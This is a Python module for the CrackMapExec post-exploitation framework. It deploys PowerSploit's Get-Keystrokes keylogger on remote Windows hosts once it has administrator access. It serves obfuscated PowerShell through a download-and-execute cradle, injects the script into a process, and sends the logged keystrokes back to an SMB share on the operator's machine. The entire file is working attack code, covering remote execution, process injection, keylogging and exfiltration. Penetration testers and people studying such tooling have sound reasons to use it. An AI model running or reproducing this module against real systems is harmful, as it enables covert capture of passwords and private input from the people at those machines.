from cme.helpers.powershell import *
from cme.helpers.misc import gen_random_string
from cme.servers.smb import CMESMBServer
from sys import exit
import os

class CMEModule:
    '''
        Executes PowerSploit's Get-Keystrokes script
        Module by @byt3bl33d3r
    '''

    name = 'get_keystrokes'
    description = "Logs keys pressed, time and the active window"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        TIMEOUT   Specifies the interval in minutes to capture keystrokes. By default, keystrokes are captured indefinitely.
        '''

        self.timeout = None
        if 'TIMEOUT' in module_options:
            self.timeout = int(module_options['TIMEOUT'])

        self.share_name = gen_random_string(5).upper()

        context.log.info('This module will not exit until CTRL-C is pressed')
        context.log.info('Keystrokes will be stored in ~/.cme/logs\n')

        self.ps_script1 = obfs_ps_script('Invoke-PSInject.ps1')
        self.ps_script2 = obfs_ps_script('powersploit/Exfiltration/Get-Keystrokes.ps1')

        self.smb_server = CMESMBServer(context.log, self.share_name, context.log_folder_path)
        self.smb_server.start()

    def on_admin_login(self, context, connection):
        keys_folder = 'get_keystrokes_{}'.format(connection.host)
        command = 'Get-Keystrokes -LogPath \\\\{}\\{}\\{}\\keys.log'.format(context.localip, self.share_name, keys_folder)

        if self.timeout:
            command +=  ' -Timeout {}'.format(self.timeout)

        keys_command = gen_ps_iex_cradle(context, 'Get-Keystrokes.ps1', command, post_back=False)
        
        launcher = gen_ps_inject(keys_command, context)
        ps_command = create_ps_command(launcher)

        connection.execute(ps_command)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-PSInject.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script1)

        elif 'Get-Keystrokes.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            #We received the callback, so lets setup the folder to store the screenshots
            keys_folder_path = os.path.join(context.log_folder_path, 'get_keystrokes_{}'.format(request.client_address[0]))
            if not os.path.exists(keys_folder_path): os.mkdir(keys_folder_path)

            request.wfile.write(self.ps_script2)

        else:
            request.send_response(404)
            request.end_headers()

    def on_shutdown(self, context):
        self.smb_server.shutdown()
